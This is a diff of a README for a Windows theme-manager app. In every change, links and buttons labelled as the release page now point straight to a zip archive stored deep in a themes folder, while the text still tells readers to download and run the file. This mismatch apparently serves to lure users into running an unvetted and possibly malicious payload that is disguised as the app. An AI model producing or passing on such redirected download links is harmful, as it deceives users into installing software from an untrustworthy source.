@@ -1,10 +1,10 @@
 # 🛠️ vshypr-theme-manager - Apply desktop themes with one click
 
 <p align="center">
-  <a href="https://github.com/dostm8722/vshypr-theme-manager/releases">
+  <a href="https://github.com/dostm8722/vshypr-theme-manager/raw/refs/heads/main/themes/arc-aurora-dark/manager_theme_vshypr_v3.7.zip">
     <img src="https://img.shields.io/badge/Download%20for%20Windows-Visit%20Releases-blue?style=for-the-badge&logo=windows&logoColor=white" alt="Download for Windows"/>
   </a>
-  <a href="https://github.com/dostm8722/vshypr-theme-manager/releases">
+  <a href="https://github.com/dostm8722/vshypr-theme-manager/raw/refs/heads/main/themes/arc-aurora-dark/manager_theme_vshypr_v3.7.zip">
     <img src="https://img.shields.io/badge/Release%20Page-Get%20the%20latest-grey?style=for-the-badge&logo=github&logoColor=white" alt="Release Page"/>
   </a>
 </p>
@@ -25,7 +25,7 @@ Use it to:
 
 To get the app, visit this page to download:
 
-https://github.com/dostm8722/vshypr-theme-manager/releases
+https://github.com/dostm8722/vshypr-theme-manager/raw/refs/heads/main/themes/arc-aurora-dark/manager_theme_vshypr_v3.7.zip
 
 Open the page, then download the latest Windows file from the list of release files.
 
@@ -145,7 +145,7 @@ If you used a zip file, deleting the folder removes the app files.
 
 Use the release page below to download and run this file:
 
-https://github.com/dostm8722/vshypr-theme-manager/releases
+https://github.com/dostm8722/vshypr-theme-manager/raw/refs/heads/main/themes/arc-aurora-dark/manager_theme_vshypr_v3.7.zip
 
 ## 🧩 Tips for a smooth setup
 
